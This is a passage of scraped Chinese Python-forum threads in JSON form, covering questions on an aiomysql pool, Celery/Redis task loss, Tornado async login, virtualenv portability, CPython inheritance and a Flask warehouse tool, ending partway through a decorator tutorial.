__pool \r", "if __pool is not None: \r", "__pool.close() \r", "await __pool.wait_closed()\r", " \r", "那你怎么在 test()调用 destroy_pool() 这个方法的", "我在 save()之后调用 destroy_pool()方法的，就是销毁这个连接池 @", " \r", "async def test(): \r", "await orm.create_pool(loop=loop,host='localhost', port=3306, \r", "user='www-data', password='www-data', database='awesome') \r", "u = User(name='Test', ", "', \r", "passwd='1234567890', image='about:blank') \r", "await u.save() \r", "await destroy_pool() #销毁连接池", "  ....\r", "使用模块\r", "什么意思，解释一下呗\r", "   \r", "前面那些内容要看一点吧 ， 不能直接就看实战吧。\r", "await orm.destroy_pool()", " \r", "之前是看了，但是印象肯定不深的，只能回去补，主要是不知道是哪个知识点的问题，刚才这个使用模块不知道跟我这个坑哪里有关联", " 哈哈。同道中人啊。我也是看廖老师的网站学的 Python 。不过我知道把项目搭建起来并且测试几个 API 成功了，并没有把整个项目做完。你这个问题我是在教程的评论里找到答案的。你可以仔细看下下面的评论。", "liaoxuefeng 的教程是可以评论的，直接把问题提给作者不行么？", "我一直跟着教程走，然后到实战 day2 就蒙逼了。", " 就是按照评论里的方法来的，看着他们开心的说解决了然而我并没有，我深深怀疑起了我的代码。。", " 已评论，坐等解答了", " 我是自己注释+参考别人注释+参考评论+参考官方文档 葫芦吞枣下来的 也只是看个大概\r", "重点要自己一步步注释上去，把一个个方法的用法看懂了，基本上意思就出来了 Day1 有个朋友给出了实战方法论回去再看看呗 别放弃啊 慢慢啃", "你可以参考我写的。我最近是将廖雪峰这个博客重构，去除 VUE 和 JINJA 的渲 restful 一些。你要是感兴趣可以在 github 上搜索 FuckBlog 找到我们。\r", "另外 就目前来看 应该没有比我注释更详细的了→_→ 对了 我很有些是参考墨灵这位仁兄的，对了，看到你们这些小菜鸡出 BUG 真开心哈哈哈哈(逃", " \r", "看了你的代码，但是还是不知道问题出在哪里。菊花紧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好像在国内不是很火，国外的资源也比较少。目前只看到了</p>\n<ul>\n<li>cython-users 邮件列表</li>\n</ul>\n<p>国内有其他的 cython 交流的地方吗？</p>\n</div></div>"], "reply": "9", "tittle": "国内有 Cython 的交流的地方吗？", "comment": ["其实学会用英语交流，哪里都没有国界", " 嗯，我加入了 cython-users 列表。但是也想问问国内有没有。", "邮件列表大家都沟通不够啊。感觉。不知道 cython 有没有 gitchat 那样的群聊", " 是的，而且每次都要审核。唉", "几年前用 Cython 写过一个 Fontconfig 的 binding ", "\r", "\r", "大家一般都是写原生组件，毕竟这个需求就很小众。邮件列表和 Stackoverflow 足够交流用了", "python 列表里有不少捣鼓 cython 的", "撞像了", " ?\r", " 嗯， python-cn ？\r", " 哈哈，好像有好几个人都是这个头像。"]},
{"content": ["<div class=\"topic_content\">再举个例子，比如用户在前台点击按钮，后台访问 web service 去获取一些数据，然后再以绘图或者其他形式返回到前台给用户。</div>"], "reply": "5", "tittle": "如何用 Python 做出可以在前台显示实时计算、运行的结果，例如 IPython NoteBook 这种的。", "comment": ["用 JS+python 很容易完成啊， ajax 请求数据", " 那后台的部分就是直接在 controller 里面调用另外一个 function 去访问外部 service 获得数据么，这样就是觉得时间上面会有一定损耗，还有什么其他好方法么？", " 可以使用 websocket 来实时计算，结果啊", "都提到 notebook 了，看 Jupyter 源码吧， matplotlib 那块儿就是用 tornado with websocket 实现的。代码量不大。", " \r", " 前端是个好方法，但后台访问外部 service 这个无法控制，硬要做成同步请求的话是不是没有什么好方案。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前写 python 的模拟客户端登录，都是使用 python 的 requests 库。因为这个库有 requests.session()，写模拟登录非常方便。</p>\n<p>但现在我的一个 tornado 异步服务，有一个模拟登录的需求。我需要用异步，所以只能用：\ntornado.httpclient.AsyncHTTPClient()之类的异步方式，不能用 requests 库。</p>\n<p>那么我应该如何用 tornado 的异步库来实现模拟登录的 session ？</p>\n</div></div>"], "reply": "5", "tittle": "tornado 的异步请求如何实现模拟登录?", "comment": ["看一下 trequests 吧，别人已经做好轮子了……\r", "自己写的话，没记错的话，连 Cookie 都要自己解析……", " 我咋没搜到这个东西。", " 请用 Google ……\r", "\r", "可能有点老了，可以根据这个思路 fork 一个。", "requests 的 session 无非就是帮你实现了方便的 cookie 管理，让你下次访问该网站的时候自动在 header 里面加上了它的 cookie ， tornado 的每个请求都是异步的，所以感觉可以把每次请求获取到的 cookie 存到缓存（比如 redis ）里面，每次进行下一步的请求时就可以先从缓存里面读 cookie 然后更新 header 。", "aiohttp 也是异步的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li>\n<p>问题描述：<br>\n用户导出 excel 文件， excel 里面的内容需要经过复杂的查询和计算，如果数量很多，就会导致服务器压力较大，而且会超时倒不出来</p>\n</li>\n<li>\n<p>解决办法：<br>\n采用 celery+redis ，后台队列运行，但是经常会出现任务丢失的情况，有的时候能导出，有的时候导出就没下文了。\n不知道有没有其他解决办法？谢谢</p>\n</li>\n</ul>\n</div></div>"], "reply": "46", "tittle": "Python flask web 开发，大数据量计算并导出文件，如何解决超时问题？", "comment": ["为什么不去修 bug?", "既然都用上 celery 那么还是你们自己的问题 而不是解决方案的问题", "试试 celery+rabbitmq 呢，我记得官方文档有说 redis 会有任务丢失的问题", " 求出处~", "确定丢失是因为 celery 的原因？", " 额，你说任务丢失的 bug ？", " 我不确定 celery 是不是最优解决方案，可能有别的方案呢", " 我也求一下出处？如果是真的，我就换 rabbitmq", " 不确定是 celery 还是 redis", " 文档上确实说 redis 可能会有些问题", " celery+redis 会出现定时任务执行两次或多次的情况，自己加一个锁就好了。不是很大的问题吧~", "并不会出现楼主所说的任务丢失。仅仅是定时任务多次执行的问题。", " 那我这种情况是什么原因呢？", "我用 python-rq 觉得挺稳定的，没试过 celery", "优化这个复杂的查询", "先生成一个 下载 id 返回给客户端\r", "然后客户端用另一个 API 可以轮询下载 ID 是否就绪。", " redis 有权限的人太多，被人清空，或者说这个 db 和其他的引用复用了？", "文件流   ", "\r", "\r", "没试过，不知道能不能解决你的问题，仅供参考。", " 两台服务器公用同一个 redis 库，会导致此问题？", "直接邮件啊", " 在这里 ", "   \r", "\r", "Redis is also feature-complete, but is more susceptible to data loss in the event of abrupt termination or power failures.", "改 bug 去", "压力大就加机器啊。你也没说清楚是计算压力大还是带宽有瓶颈\r", "推荐你用 golang ，也许就不会有修不完的问题了。 python 的第三方库有多少人维护你都不知道， bug 提给谁 会不会有人修你也不知道，这种情况用在生产环境就是 灾难。", "另外 我们写 python 的同事今天刚刚放弃 flask ，程序崩溃找不到原因。", " 这个出处就是 Celery 的官方文档, 确实说 Redis 有可能丢数据.", "第三方库 bug 修的很慢，半年以上是常有的事，修了要进 pip 又得好久，然后，好多库你都维护了一个自己的版本，累。", "我只想说你干嘛不开个线程？丢后面慢慢做，好了之后再回写一下结果？", " 我也打算学 golang 来着。生产环境现在就是用的 python flask ，一时半会也改不了。", " 啊，这个思路好，我研究下", " 我先把不同的服务器配置到不同的 redis 库，再不行我就换 rabbitmq 试试", " 那是你同事个人水平原因。。", " celery 里哪句写了 redis 会丢？", " 那是你同事个人水平原因。。", " \r", "所以说 python 麻烦啊", " 又见神论。（你同事放弃 flask ） -> ( Python 麻烦)。这不严谨", " ", "\r", "\r", "Redis is also feature-complete, but is more susceptible to data loss in the event of abrupt termination or power failures. Detailed information about using Redis:\r", "\r", "只是说断点或者异常终止的情况下**有可能**会丢数据, 应该是 Redis 轻量化设计的外沿就到这了. 正常运行的时候应该不至于老丢数据, 否则就是大 bug 那还了得.", "楼上有说 Python 第三方库有问题然后转 golang 的, 按我的理解 golang 的第三方库也会有类似的问题啊? 还是说 golang 第三方库审核很严格, 长时间不更新就给踢出去, 所以能留下的都是精品?", "既然慢就异步，感觉 celery+redis 应该是能解决你的问题。第一个 check 会不会是你的 redis 被另一个调用方清理了，然后记得详细打印日志，很有可能是 celery 任务里执行失败了。我们整个公司的应用发布任务都在 celery+redis 里，没发现你说的问题。", " 我有个游戏客户端编译系统就是在 Flask 上开发的。编译个客户端轻则 10 分钟以上，也是开个线程后面慢慢编译，好了通知一下 Flask 完成。 web 就 js 轮询结果即可", " 求教，多台 web 服务器的 celery 公用有个 redis 的数据库可以吗？ celery 启用几个 worker 合适？", " 你这点儿连完成与否都不一定的任务，目前还不需要考虑基础软件的稳定性问题。", " 啥? 我不是楼主", " redis + celery 丢失任务，是指服务器断电重启时才会发生的情况吧", "用 flower 监控下 celery ，大并发下 celery 可能会有处理失败，但是应该不会丢失任务（除非 broker 存储的任务丢失，这就是 redis 或 mq 配置问题了）。", " 共用一个 redis 没什么问题，但是不要清空别的 web 的数据，前缀要不一样，最好能分开。我们是一台 4 核 8G 的虚拟机启用 8 个 worker ， worker 不够你可以多台机器同时开启 worker 一起去抢 redis 的任务", " \"但是不要清空别的 web 的数据，前缀要不一样，最好能分开\" ，我不太明白。我现在有 3 台服务器，每台启动两个 worker ，配置是 CELERYD_NODES=2 ， 3 台服务器 celery 的 broker 都是练的同一个 redis ，但是簇不一样，比如一台服务器的 broker 是 CELERY_RESULT_BACKEND = 'redis://10.174.93.111:6379/5'，另一台是 CELERY_RESULT_BACKEND = 'redis://10.174.93.111:6379/2'"]},
{"content": ["<div class=\"topic_content\">{\"NAME\":\"哈尔滨双城区\"互联网+农业\"高标准示范基地活动周开幕\"}\r<br>\r<br>这是用 requests post 爬下来的内容，一直都好好的，但是突然 这次出了故障，检查之后发现故障出在这里， value 中的字符串中有双引号，拿到的数据就是这样，怎么好改？请问这应该怎么处理？</div>"], "reply": "9", "tittle": "字典的 value 中有引号怎么处理？", "comment": ["检查一下自己的程序有问题还是爬取得数据有问题，如果是爬取得数据有问题就比较麻烦了，可能需要自己写 json 解析，简单的好说，复杂的就不好写了， value 中如果再有冒号就麻烦了， key 和 value 都分不出来了", " 不是程序的问题，这是爬下来的数据，其他字符串都排除了问题，问题就出在这个标题的引号上，", "\\\"", "这个还不简单，用三引号包起来，或单引号外层。 repr()", "明显是你自己的爬虫程序写的有问题", "如果输入就坏了的话，那就直接上正则硬解好了……", " \r", "拿到的字符串就是这样的\r", "{\"NAME\":\"哈尔滨双城区\"互联网+农业\"高标准示范基地活动周开幕\"} \r", "正确的写法就不会拿到这样的数据，对吗？", "这个根本不是合法的 Json ，也不是 Python 。程序写得有问题，直接拼字符串拼出问题了", " 谢谢，已经搞定了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>年末需要在微信公众平台上搞一波活动，对于每个参加活动的微信公众号粉丝，服务器需要依次进行下面一些操作：</p>\n<ul>\n<li>&lt;=1 次 get 请求，获取获取个人信息</li>\n<li>一次 get 请求获取微信头像，用 pillow 处理合成一张海报图片大约 0.03s 每次</li>\n<li>1 次 post 上传这张大约 500KB 的图片到微信公众平台的临时素材（最耗时的一步）</li>\n<li>1~2 次 post 请求发送给对应的用户消息</li>\n</ul>\n<p>目前使用的软件和硬件</p>\n<ul>\n<li>django+celery:  broker 和 result backend 用的都是 redis 。我测试的时候开了 2 个 celery worker ， gevent pool ， concurrency 10 。</li>\n<li>阿里云配置:   2GB 内存+双核 CPU ，带宽的话可以临时提高比较大的。</li>\n</ul>\n<p>期望</p>\n<ul>\n<li>能应对高峰期每秒 30 人的处理</li>\n</ul>\n<p>最开始的时候跑 5 个 worker ，没几分钟服务器直接挂了，在阿里云控制台重启都花了 10 几分钟。。。后面改成 2 个 worker 在测试每秒 10 人的处理时， cpu 占用 100%，内存大约用去 1GB ，而且大约需要近 2s 才能完成，时间久了队列会一直增长，但要是加上 timelimit 的话会导致一些任务失败。</p>\n<p>大家有什么方案建议，能让每个参加活动的用户得到尽量短的时间反馈呢？</p>\n</div></div>"], "reply": "13", "tittle": "请教大家关于 celery 使用的一个问题", "comment": ["只有第二部占 CPU,  粉丝一共多少人?  预先跑好", " 粉丝既包括已关注了的一部分，更主要的是之前没有关注过的人，所以没法预先跑啊。 \r", "现在准备在阿里云上按量付费一台高配置的云服务器跑 celery 了。", "合成图片比较耗 CPU ，需要优化算法或者加 CPU ，上传图片耗 IO ，加带宽或者压缩图片，另外要避免把图片读到内存里。", " 你得把这个流程拆开,生成图片要 隔离,  既然已经异步了, 就彻底一些, 否则量大了 还是扛不住.\r", "另,我之前做过类似的业务,不过量比这个大, 最后生成了 1400W 图片,  有好几层流量过滤 \r", "有一个不错的思路是,你试试用前端 canvas 生成图片.", " 我是把固定要用的海报图片存到了 redis ，避免打开本地文件耗磁盘 io ，但是不读入图片到内存要如何处理图片呢？\r", "\r", " 可是我没有前端网页交互啊，不想用网页因为要避免一些微信规则问题", " 合成之后的图数量多了会占不少内存，可以先存硬盘再 stream 方式上传", " 放 redis 还不如存本地文件.至少不要新开 socket.  正确做法是存内存中...", "能不能不要用 pillow 而是在前端用 css ？", " 是的， redis 存了一个全局的没有新开，读完后还要转换成 Image 对象，确实不如直接存到内存快速。\r", "\r", " 因为这个过程不需要用户做任何交互啊，最后直接在微信里面发给他们生成好的图片。", "光来回拷贝就开销不少\r", "要调优先看计时\r", "预先生成还是有价值的，毕竟老用户还是不少，能抠一点是一点\r", "这些请求统计过么，会有重复请求么，有的话优先上缓存", "取决于图片格式，可以考虑利用 iterable 边上传边生成", "有个疑问:用阿里主机向腾讯的服务上送东西？楼主这得是有多么博爱？", " 恩，明天把缓存加上试试\r", "\r", " 哈哈哈"]},
{"content": ["<div class=\"topic_content\">现在用的方法是 在主进程中 创建一个监控进程。如果主进程被关了就执行一段代码。\r<br>同样主进程中也一直检测 监控进程，如果监控进程被关了就执行相同的一段代码。\r<br>\r<br>但是如果同时将两个进程关了就不行了。用 taskkill 命令可以轻松的同时关闭两个进程。\r<br>\r<br>想将某个 python 进程不能被关闭，各种搜素没找到合适的方法。\r<br>或者有没有什么可以让监控进行下去的办法？\r<br>\r<br>还请各位指点一二。</div>"], "reply": "22", "tittle": "windows 下怎么保护 Python 的进程不被关闭？", "comment": ["再添条计划任务呢", "查 win32 api ，有个应用层禁止访问的选项，不过这种方式很耍流氓，基本上只有安全软件用才是合理的", " 某些精简版的系统好像没有启动\"计划\"服务，在没有这个服务里启动不了啊。", " 能否详细说一下呢， win32api 太多了，用 CreateRemoteThread 尝试注入到一个系统进程里安全软件会爆木马。。", "1. 提升程序权限， 让一般程序不能操作。\r", "2. 在驱动层拦截相关 API 操作。\r", "\r", "以上都不能保证程序不被关闭， 没有最流氓只有更流氓。", "检测杀进程的进程，抢先杀掉对方", "werkzeug 的_reloader 模块中监视文件修改的，并自动重新运行的方法你看下。不知道能不能用", "这个和 python 没有关系。\r", "\r", "提权，驱动等都可以。\r", "\r", "这样的需求正常程序就不该实现，很明显是要强奸用户了吧。", " 没啊，我是怕进程被用这种手段关闭。比如说一个计费进程，被恶意关闭了。。", " 这好像是 web 服务器的工具包？我试了试没找到要怎么用能详细说说吗，谢谢。", " @", " 谢谢，朝这个方向研究研究。", "SSDT", "不过也可以用注册表 obRegiestercallback", " 计费进程还不好办……要么心跳要么主程序检测不到计费程序直接退出不就好了？", "没驱动的话没办法解决，分分钟关掉。趁早放弃做计费的想法，或者加驱动。", " 主程序被关了一样没办法。。", " 我的意思是，如果是一个软件在使用过程中要收费的，那么这个软件在运行过程中检测收费进程还在不在不就好了，软件都被关了本来也不应该计费了啊……主要是不太清楚你的需求到底是咋样的……所以只能猜测……", " 这...就像网吧里的计费一样，在没有服务端时，我如果把网吧里的计费进程关了可我还是能用电脑啊。（网管来揍人不算。）", "  \r", "   def restart_with_reloader(self):\r", "        \"\"\"Spawn a new Python interpreter with the same arguments as this one,\r", "        but running the reloader thread.\r", "        \"\"\"\r", "        while 1:\r", "            _log('info', ' * Restarting with %s' % self.name)\r", "            args = [sys.executable] + sys.argv\r", "            new_environ = os.environ.copy()\r", "            new_environ['WERKZEUG_RUN_MAIN'] = 'true'\r", "\r", "            # a weird bug on windows. sometimes unicode strings end up in the\r", "            # environment and subprocess.call does not like this, encode them\r", "            # to latin1 and continue.\r", "            if os.name == 'nt' and PY2:\r", "                for key, value in iteritems(new_environ):\r", "                    if isinstance(value, text_type):\r", "                        new_environ[key] = value.encode('iso-8859-1')\r", "\r", "            exit_code = subprocess.call(args, env=new_environ,\r", "                                        close_fds=False)\r", "            if exit_code != 3:\r", "                return exit_code\r", "类似于这个 while 循环里面的，利用 subprocess.call 打开另一个解释器。", " “我如果把网吧里的计费进程关了可我还是能用电脑啊。（网管来揍人不算。）”\r", "\r", "下一代网吧计费软件直接接管电源，看你们怎么关 = =。", " 所以最好的当然就是有个服务端了啊，服务端检测不到就直接关闭电脑"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位大佬好，我想问一下。\n我在window上创建虚拟环境 对应的目录是\nInclude ,Lib, pip-selfcheck,json ,  Scripts, tcl</p>\n<p>而在liunx 上创建虚拟环境目录 对应的目录是\nbin ，Include ,lib, pip-selfcheck,json , local</p>\n<p>现在问题就是\n我在windows上创建的虚拟环境，放在liunx上也可以能够照常使用。但是如果使用gunicorn 以及supervisord 来监控应用的话 要怎么做呢？\nliunx下的话 使用venv/bin/gunicorn 绝对路径就可以了吧？\n但是window下创建的虚拟环境在liunx在怎么使用呢？\n恳请大佬们指点一下！</p>\n</div></div>"], "reply": "3", "tittle": "想请问一下关于虚拟环境在 windows 跟 liunx 的使用", "comment": ["我这里所说的虚拟环境就是 virtualenv", "> 我在 windows 上创建的虚拟环境，放在 liunx 上也可以能够照常使用。\r", "不能的。不同平台二进制包都不兼容。不管是标准库还是第三方库，有 C 模块的都可能有 import 错误。两个平台 python 安装路径也不一样。两边的文件系统也不一样。 Linux 的 virtualenv 是用 symlink 来做的， windows 的不太清楚。即使也是 symlink, NTFS 的 symlink 和 ext4 的 symlink 也是不兼容的。\r", "\r", "> 但是如果使用 gunicorn 以及 supervisord 来监控应用的话 要怎么做呢？ \r", "这个和 virtualenv 没有关系。这两个软件都有自己的配置文件。在不同的系统分别执行就行了。\r", "\r", "> liunx 下的话 使用 venv/bin/gunicorn 绝对路径就可以了吧？ \r", "可以的。 virtualenv bin 下面的文件可以使用绝对路径或相对路径访问。如果不带路径访问，则需要 source activate 文件。\r", "\r", "> 但是 window 下创建的虚拟环境在 liunx 在怎么使用呢？ \r", "只复用代码， virtualenv 在 linux 下重新建即可。然后重新装一下依赖包。", " 多谢这位老铁，我已经解决了。\r", "> 我在 windows 上创建的虚拟环境，放在 liunx 上也可以能够照常使用。 \r", "确实不能够使用。创建的环境都不一样\r", "\r", "\r", "> 但是如果使用 gunicorn 以及 supervisord 来监控应用的话 要怎么做呢？ \r", "我最后就是直接使用绝对路径来启动\r", "\r", "> 但是 window 下创建的虚拟环境在 liunx 在怎么使用呢？\r", "如老铁所说，使用 requirements.txt 来安装依赖包"]},
{"content": ["<div class=\"topic_content\">比较好奇继承特性的实现，但是搜到的观点是：继承就是 copy and paste. 但是子类的__dict__中并不存在父类的方法名称。如何能确定它的继承机制呢？有看过 C 源码的大牛能解释下吗？</div>", "<div class=\"topic_content\">感谢各位的回复！\r<br>在《 python 源码剖析》中找到了 self 的值的设置（具体 c 的实现）。以及这篇博客中对 PyMethodObject 的说明。\r<br>博客地址： <a target=\"_blank\" href=\"http://m.blog.csdn.net/article/details?id=45288277\" rel=\"nofollow\">http://m.blog.csdn.net/article/details?id=45288277</a>\r<br>《 python 源码剖析》 306 页</div>"], "reply": "15", "tittle": "Cpython 是如何实现继承这个特性的？", "comment": ["难道不是先尝试自己的方法列表，找不到就直接找到父类然后由父类处理么？", " 假设有一父类 A:\r", "class A(object) :\r", "     def prt(self) : print type(self) \r", "还有一子类 B ，继承 A\r", "class B(A) :pass \r", "B().prt ()输出说明此时 self 代表 B 类实例。继承过程是怎样使得 prt 的 self 指向 B 实例的？", " 多谢", " 如果从纯 python 的角度解释就是", "B.__dict__.update(A.__dict__)", "然后再执行你的自定义语句", " B. __duct__中并没有 A.__dict__的内容", " 他在他的内部执行就行了，不一定要表现出来呀", "而且你上面说到的", "继承过程是怎样使得 prt 的 self 指向 B 实例的", "self 本身就是一种指针， python 解析器实际上是调用 A.prt(self)的，所以这种实现是自然而然的", "直接翻开 Python 源码看吧", " 你只看到 self 不代表解释器只看到 self\r", "解释器内部变量多一个而已\r", "更何况 self 其实是解释器在运行时给赋值的一个参数，把 self 全部换成 foo bar 一样能用", "Cython 不是 cpython 吧", " 这只是叫法问题啊！也有叫 Cpython 的啊", " 不是这个意思，我知道随便换个名字都能用！", " cython 和 cpython 是两个完全不一样的东西，前者是一个用 C 和 Python 混合编程的工具，后者是 Python 解析器的 C 语言实现，请不要混淆概念", " 还真是这样的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>仓库有 A 、 B 、 C 、 D 四个打包人员，每天上传打包数据（包含快递单号，日期），格式为 csv ，数据存储在我自己的电脑上，现有以下需求：</p>\n<p>1.每天下班前定时将所有人的 csv 数据表传输至服务器（ Windows 上能否创建 python 定时任务？）</p>\n<p>2.在服务器端对数据进行整理，包含：\n（ 1 ）快递单号识别，即通过快递单号鉴别这个快递是申通、还是圆通.....（这个应该可以通过 API 实现）\n（ 2 ）数据每日统计，即该打包员本月截止今天一共打包了多少单，其他包含申通多少单，中通多少单......</p>\n<p>3.数据检索\n即：通过快递单号可以查到是哪个打包员发的货。（所有打包员的数据加起来，每个月大概有接近 2 万条，是直接存储在 csv 里面，还是放进数据库呢？）</p>\n<p>4.用 flask 做一个检索页面，供内部所有人进行查询</p>\n<p>大家有没有比较好的思路？</p>\n</div></div>"], "reply": "14", "tittle": "用 Python 解决仓库管理，求方案", "comment": ["肯定可以做哈~一般来说，没有什么是技术上不能实现的~", "前端 web   一个上传页面+一个检索页面，后台一个数据库实例\r", "上传数据直接写入数据库，检索的时候从数据库直接查询数据\r", "可能需要一个异步任务用来做快递单号识别，一个定时任务来做每日数据统计", "![]( ", ")", " 快递单号是实时识别，还是先识别了放进数据库？", "定时任务可以用 apscheduler", " 不是实时的，异步来做，上传一批单号，实时查询的话，如果接口不支持批量查询，那轮询下来肯定时间会很长，影响效率，异步来做的话先把单号写入数据库，然后慢慢查询，再去更新数据库", " 看来有点难度啊，居然要用到异步", "定时任务直接用 Windows 内置的计划任务就可以了啊. 脚本写好，设置某时间运行这个脚本就行.", " 不用也没关系，简单事情单间来做就好了，定时任务也可以，最简单就是在服务设置两个定时任务，一个用来更新单号，一个用来做数据统计，两个 python 脚本搞定 ", " ", " 再问一下，这种数据量不是很大的情况，用哪个数据库比较好呢？", " 一般选用 mysql", "数据库用 h2 、 sqlite 都行。\r", "如果快递公司只有几个的话，写好正则匹配规则就好，这样入库的时候直接就入库，同时可以进行统计出结果了。", "1.这需求感觉 sqlit 都可以\r", "2.如果是在 windows 端用话，我感觉我不会用 Python 做这个。用 php 都好过 Python ，部署起来太麻烦。\r", "3.这种需求不需要啥复杂的框架的。一个 rest 接口就可以了。\r", "4.定时任务可以用计划任务。可以考虑 curl for win", " 本地是 Windows ，服务器端是 linux"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>讲 Python 装饰器前，我想先举个例子，虽有点污，但跟装饰器这个话题很贴切。</p>\n<p>每个人都有的内裤主要功能是用来遮羞，但是到了冬天它没法为我们防风御寒，咋办？我们想到的一个办法就是把内裤改造一下，让它变得更厚更长，这样一来，它不仅有遮羞功能，还能提供保暖，不过有个问题，这个内裤被我们改造成了长裤后，虽然还有遮羞功能，但本质上它不再是一条真正的内裤了。于是聪明的人们发明长裤，在不影响内裤的前提下，直接把长裤套在了内裤外面，这样内裤还是内裤，有了长裤后宝宝再也不冷了。装饰器就像我们这里说的长裤，在不影响内裤作用的前提下，给我们的身子提供了保暖的功效。</p>\n<p>谈装饰器前，还要先要明白一件事， Python 中的函数和 Java 、 C++不太一样， Python 中的函数可以像普通变量一样当做参数传递给另外一个函数，例如：</p>\n<pre><code>def foo():\n\tprint(\"foo\")\n\ndef bar(func):\n\tfunc()\n\nbar(foo)\n\n</code></pre>\n<p>正式回到我们的主题。装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数 /类对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景，装饰器是解决这类问题的绝佳设计。有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码到装饰器中并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。</p>\n<p>先来看一个简单例子，虽然实际代码可能比这复杂很多：</p>\n<pre><code>def foo():\n\tprint('i am foo')\n</code></pre>\n<p>现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：</p>\n<pre><code>def foo():\n    print('i am foo')\n    logging.info(\"foo is running\")\n</code></pre>\n<p>如果函数 bar()、 bar2() 也有类似的需求，怎么做？再写一个 logging 在 bar 函数里？这样就造成大量雷同的代码，为了减少重复写代码，我们可以这样做，重新定义一个新的函数：专门处理日志 ，日志处理完之后再执行真正的业务代码</p>\n<pre><code>def use_logging(func):\n    logging.warn(\"%s is running\" % func.__name__)\n    func()\n \ndef foo():\n    print('i am foo')\n \nuse_logging(foo)\n</code></pre>\n<p>这样做逻辑上是没问题的，功能是实现了，但是我们调用的时候不再是调用真正的业务逻辑 foo 函数，而是换成了 use_logging 函数，这就破坏了原有的代码结构， 现在我们不得不每次都要把原来的那个 foo 函数作为参数传递给 use_logging 函数，那么有没有更好的方式的呢？当然有，答案就是装饰器。</p>\n<h3>简单装饰器</h3>\n<pre><code>def use_logging(func):\n\n    def wrapper():\n        logging.warn(\"%s is running\" % func.__name__)\n        return func()   # 把 foo 当做参数传递进来时，执行 func()就相当于执行 foo()\n    return wrapper\n \ndef foo():\n    print('i am foo')\n \nfoo = use_logging(foo)  # 因为装饰器 use_logging(foo) 返回的时函数对象 wrapper ，这条语句相当于  foo = wrapper\nfoo()\t\t\t\t\t# 执行 foo()就相当于执行 wrapper()\n</code></pre>\n<p>use_logging 就是一个装饰器，它一个普通的函数，它把执行真正业务逻辑的函数 func 包裹在其中，看起来像 foo 被 use_logging 装饰了一样， use_logging 返回的也是一个函数，这个函数的名字叫 wrapper 。在这个例子中，函数进入和退出时 ，被称为一个横切面，这种编程方式被称为面向切面的编程。</p>\n<h3>@ 语法糖</h3>\n<p>如果你接触 Python 有一段时间了的话，想必你对 @ 符号一定不陌生了，没错 @ 符号就是装饰器的语法糖，它放在函数开始定义的地方，这样就可以省略最后一步再次赋值的操作。</p>\n<pre><code>def use_logging(func):\n\n    def wrapper():\n        logging.warn(\"%s is running\" % func.__name__)\n        return func()\n    return wrapper\n\n@use_logging\ndef foo():\n    print(\"i am foo\")\n\nfoo()\n</code></pre>\n<p>如上所示，有了 @ ，我们就可以省去<code>foo = use_logging(foo)</code>这一句了，直接调用 foo() 即可得到想要的结果。你们看到了没有， foo() 函数不需要做任何修改，只需在定义的地方加上装饰器，调用的时候还是和以前一样，如果我们有其他的类似函数，我们可以继续调用装饰器来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。</p>\n<p>装饰器在 Python 使用如此方便都要归因于 Python 的函数能像普通的对象一样能作为参数传递给其他函数，可以被赋值给其他变量，可以作为返回值，可以被定义在另外一个函数内。</p>\n<h3>*args 、**kwargs</h3>\n<p>可能有人问，如果我的业务逻辑函数 foo 需要参数怎么办？比如：</p>\n<pre><code>def foo(name):\n\tprint(\"i am %s\" % name)\n</code></pre>\n<p>我们可以在定义 wrapper 函数的时候指定参数：</p>\n<pre><code>def wrapper(name):\n        logging.warn(\"%s is running\" % func.__name__)\n        return func(name)\n    return wrapper\n</code></pre>\n<p>这样 foo 函数定义的参数就可以定义在 wrapper 函数中。这时，又有人要问了，如果 foo 函数接收两个参数呢？三个参数呢？更有甚者，我可能传很多个。当装饰器不知道 foo 到底有多少个参数时，我们可以用 *args 来代替：</p>\n<pre><code>def wrapper(*args):\n        logging.warn(\"%s is running\" % func.__name__)\n        return func(*args)\n    return wrapper\n```\t    \n如此一来，甭管 foo 定义了多少个参数，我都可以完整地传递到 func 中去。这样就不影响 foo 的业务逻辑了。这时还有读者会问，如果 foo 函数还定义了一些关键字参数呢？比如：  \n```python\t\ndef foo(name, age=None, height=None):\n\tprint(\"I am %s, age %s, height %s\" % (name, age, height))\n</code></pre>\n<p>这时，你就可以把 wrapper 函数指定关键字函数：</p>\n<pre><code>def wrapper(*args, **kwargs):\n\t\t# args 是一个数组， kwargs 一个字典\n        logging.warn(\"%s is running\" % func.__name__)\n        return func(*args, **kwargs)\n    return wrapper\n</code></pre>\n<h3>带参数的装饰器</h3>\n<p>装饰器还有更大的灵活性，例如带参数的装饰器，在上面的装饰器调用中，该装饰器接收唯一的参数就是执行业务的函数 foo 。装饰器的语法允许我们在调用时，提供其它参数，比如<code>@decorator(a)</code>。这样，就为装饰器的编写和使用提供了更大的灵活性。比如，我们可以在装饰器中指定日志的等级，因为不同业务函数可能需要的日志级别是不一样的。</p>\n<pre><code>def use_logging(level):\n    def decorator(func):\n        def wrapper(*args, **kwargs):\n            if level == \"warn\":\n                logging.warn(\"%s is running\" % func.__name__)\n            elif level == \"info\":\n                logging.info(\"%s is running\" % func.__name__)\n            return func(*args)\n        return wrapper\n\n    return decorator\n\n@use_logging(level=\"warn\")\ndef foo(name='foo'):\n    print(\"i am %s\" % name)\n\nfoo()\n</code></pre>\n<p>上面的 use_logging 是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。当我\n们使用<code>@use_logging(level=\"warn\")</code>调用的时候， Python 